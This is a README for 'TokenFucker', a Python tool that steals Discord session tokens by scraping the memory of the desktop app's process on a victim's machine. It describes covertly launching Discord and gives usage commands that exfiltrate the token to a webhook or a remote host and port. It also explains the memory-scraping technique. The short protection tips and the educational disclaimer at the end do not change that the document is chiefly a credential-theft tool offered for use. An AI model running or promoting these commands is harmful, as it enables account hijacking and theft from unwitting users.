# TokenFucker
![TokenFucker](https://media.discordapp.net/attachments/843628315146321940/1049398161254391808/TokenFucker5.png?width=960&height=346)
<p align="center">
    <em>Cross plataform tool for Discord Token Stealing</em></p>
    <p align="center">
    <a href="https://github.com/ZaikoARG/PyDump/blob/main/LICENSE">
      <img src="https://img.shields.io/badge/license-Apache%202-blue.svg" />
    </a>
    <a href="https://www.python.org/">
    	<img src="https://img.shields.io/badge/built%20with-Python%203.10-red.svg" />
    </a>
    <a href="">
    	<img src="https://img.shields.io/badge/platform-Win%2064%20%7C%20Linux%2032%20%7C%20Linux%2064-blue.svg" />
    </a>
  </p>



---

**Discord:** ZaikoARG#1187

---

TokenFucker is a cross-platform tool for Windows and Linux written in python, with the functionality to steal Discord user tokens in a few seconds. 
It is a tool that runs on the victim's machine, and it needs the victim to have the desktop application installed to work. It offers the ability to run even when the desktop application is closed.

Next, the most relevant functions of TokenFucker will be detailed:
* **Cross platform support:** TokenFucker works on both Windows and Linux (*tested only on its latest versions*)
* **Discord's Ghost Execution:** TokenFucker requires the Discord desktop app to be running to work.
But if it is not running, our tool can run it from behind, without anyone knowing.
* **Send Tokens via a Discord Webhook:** If you want, you can specify a Discord Webhook URL on the command line, so that the Token will be sent by that Webhook automatically when found.
* **Send Tokens to a Remote Host:** If you want, you can send the obtained Token to a Remote Host, specifying a host and a specific port (TCP) on the command line.

---

## Example of Usage

Steal User Discord Token

`python3 tokenfucker.py -r`

Steal a discord token by specifying the Discord desktop app binary

`python3 tokenfucker.py -df C:\Users\ZaikoARG\Documents\Discord\Discord.exe -r`  

Steal a discord token and send it to a webhook

`python3 tokenfucker.py -wh {URL} -r`

Steal a discord token and send it to a Remote Host

`python3 tokenfucker.py -rh 10.10.14.37,443 -r`

## Documentation
`python3 tokenfucker.py (options) -r`
|Option|Description|
|--|--|
|-df, --discord-file [PATH]|Enter discord binary file manually.|
|-wh, --webhook-url [URL]|Send Result to Webhook.|
|-rh, --remote-host [HOST,PORT]|Send to Remote Host (Introduce Host and Port separated by comma) Example: python tokenfucker.py -rh 127.0.0.1,443|
|--no-root|Disable root checking on Linux Systems (The steal may not work properly).|
|-r|Run the Token Stealing.|

## Functioning
TokenFucker exploits a Discord Desktop Application Memory leak vulnerability to obtain the user's Discord Token.

What TokenFucker does, going into a little more detail, is to look in the memory of the Discord desktop application process, for the authentication headers, which contain the token, sent in the communication between the application and the discord server.


What happens is that the Discord application, every time it has to communicate with its servers for different things, such as sending messages, downloading messages, updating chats and a long etc... makes a web request to these, and to verify which user these requests are being made, a Session Token is used, which is the famous Discord Token that we are looking for so much. This token is sent in a header called Authentication.
When the Discord application creates the request and sends it to the servers, certain data is reflected in the process memory, such as the Authentication header and the user's Token.

## Protection and Prevention
To protect yourself and prevent Discord token theft, I recommend the following:
* Do not save passwords in your browser and do not remember sessions in the browser.
* If possible, do not use the Discord Desktop application, use the Browser instead.
* Log out of your Discord account always, both in the Browser and in the Desktop Application.
* Do not download suspicious or unofficial things from the internet or open any link they send you, without trusting their origins, or verifying them.


## Disclaimer
**This tool was created only for educational purposes, its creators are not responsible for the misuse anyone can give it.**


## License
Copyright © 2022, ZaikoARG. All rights reserved.

Licensed under the Apache 2.0 License.
